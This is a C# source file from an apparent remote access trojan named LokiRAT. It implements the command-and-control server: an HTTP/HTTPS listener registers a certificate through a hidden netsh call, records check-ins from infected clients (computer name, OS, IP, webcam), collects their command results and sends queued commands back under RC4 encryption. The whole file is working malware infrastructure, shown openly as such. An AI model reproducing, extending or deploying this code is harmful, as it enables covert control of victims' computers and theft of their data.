using common;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Web;
using System.Windows.Forms;

namespace LokiRAT
{
    class HttpServer
    {
        string _url = "";
        string _cert = "";
        HttpListener _listener = new HttpListener();

        public HttpServer(string url, string cert)
        {
            _url = url;
            _cert = cert;

            if (_url[_url.Length - 1] != '/')
                _url += "/";
        }

        public void Start()
        {
            try
            {
                Uri uri = new Uri(_url);

                if (uri.Scheme.ToLower() == "https")
                {
                    X509Certificate2 certificate = new X509Certificate2(_cert);

                    Process p = new Process();
                    p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.RedirectStandardError = true;
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.CreateNoWindow = true;
                    p.StartInfo.FileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "netsh.exe");
                    p.StartInfo.Arguments = string.Format("http add sslcert ipport=0.0.0.0:{0} certhash={1} appid={{{2}}}", uri.Port, certificate.Thumbprint, Guid.NewGuid());
                    p.Start();
                    p.WaitForExit();
                }

                _listener.Prefixes.Add(_url);
                _listener.Start();

                main.LogLine("Listen OK");

                Thread thread = new Thread(delegate ()
                {
                    while (true)
                    {
                        try
                        {
                            var context = _listener.GetContext();
                            ThreadPool.QueueUserWorkItem(o => HandleRequest(context));
                        }
                        catch (Exception)
                        {
                            break;
                        }
                    }
                });
                thread.IsBackground = true;
                thread.Start();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        public void Stop()
        {
            if (_listener.IsListening)
            {
                _listener.Stop();
                _listener.Prefixes.Clear();
            }
        }

        byte[] getPayload(HttpListenerContext context)
        {
            int length = (int)context.Request.ContentLength64;
            byte[] payload = new byte[length];
            int numRead = 0;
            while (numRead < length)
                numRead += context.Request.InputStream.Read(payload, numRead, length - numRead);

            return payload;
        }

        private string ProcessText(string text)
        {
            var queryParameters = HttpUtility.ParseQueryString(text);
            if (queryParameters.HasKeys())
            {
                string id = queryParameters["id"];
                switch (queryParameters["mode"])
                {
                    case "info":
                        {
                            if (!Global.ClientExists(id))
                            {
                                ClientInfo clientInfo = new ClientInfo();
                                clientInfo.id = id;
                                clientInfo.compName = queryParameters["compName"];
                                clientInfo.operatingSystem = queryParameters["os"];
                                clientInfo.ipAddress = queryParameters["ip"];
                                clientInfo.ramMemory = queryParameters["memory"];
                                clientInfo.processor = queryParameters["processor"];
                                clientInfo.webcam = queryParameters["webcam"];
                                clientInfo.interval = queryParameters["interval"];
                                clientInfo.lastUpdate = DateTime.Now.ToString();

                                Global.ClientList.Add(clientInfo);

                                if (!Global.lastCommand.ContainsKey(id))
                                    Global.lastCommand.Add(id, "");
                                if (!Global.lastCommandText.ContainsKey(id))
                                    Global.lastCommandText.Add(id, "");
                                if (!Global.idCommands.ContainsKey(id))
                                    Global.idCommands.Add(id, new List<string>());

                                main.AddClient(clientInfo);
                            }
                            else
                            {
                                ClientInfo clientInfo = Global.GetClientById(id);
                                clientInfo.interval = queryParameters["interval"];
                                clientInfo.lastUpdate = DateTime.Now.ToString();

                                main.UpdateClient(clientInfo);
                            }
                        }
                        break;
                    case "result":
                        {
                            string result = HttpUtility.UrlDecode(queryParameters["result"]);

                            lock (Global.lastCommand)
                                Global.lastCommand[id] = "";
                            lock (Global.lastCommandText)
                                Global.lastCommandText[id] = result;

                            if (result.Length >= 80)
                                main.LogLine(result.Substring(0, 80));
                        }
                        break;
                }
                return Global.GetCommandFromList(id);
            }
            return null;
        }

        private void HandleRequest(object state)
        {
            try
            {
                var context = (HttpListenerContext)state;

                main.LogLine(string.Format("{0}\t{1}\t{2}\t{3}\t{4}", context.Request.HttpMethod, context.Request.RawUrl, context.Request.RemoteEndPoint.Address.ToString(), context.Request.UserAgent,
                    DateTime.Now.ToString()));

                context.Response.StatusCode = 200;
                context.Response.SendChunked = false;
                context.Response.KeepAlive = false;

                byte[] buf = getPayload(context);

                buf = gzip.Decompress(RC4.Decrypt(Encoding.ASCII.GetBytes(Global.Key), buf));
                if (buf == null)
                {
                    context.Response.Close();
                    return;
                }

                string cmd = ProcessText(Encoding.ASCII.GetString(buf));
                if (cmd == null)
                {
                    context.Response.Close();
                    return;
                }

                buf = RC4.Encrypt(Encoding.ASCII.GetBytes(Global.Key), gzip.Compress(Encoding.ASCII.GetBytes(cmd)));
                context.Response.ContentType = "application/octet-stream";
                context.Response.ContentLength64 = buf.Length;
                context.Response.OutputStream.Write(buf, 0, buf.Length);

                context.Response.Close();
            }
            catch (Exception ex)
            {
                main.LogLine(ex.Message);
            }
        }
    }
}